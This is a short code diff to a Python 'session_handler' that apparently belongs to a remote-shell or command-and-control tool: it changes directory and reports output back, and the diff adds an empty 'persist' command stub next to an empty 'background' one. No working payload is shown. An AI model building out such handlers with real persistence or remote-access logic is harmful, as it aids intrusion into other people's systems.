@@ -40,12 +40,16 @@ def session_handler():
                 cur_dir = os.getcwd()
                 print(f"[+] Changed to {cur_dir}")
                 outbound(cur_dir)
+            
 
             except FileNotFoundError:
                 outbound("[-] File or directory does not exist.")
                 continue
         
         elif message == "background":
+            pass
+        
+        elif message == "persist":
             pass
 
         else:
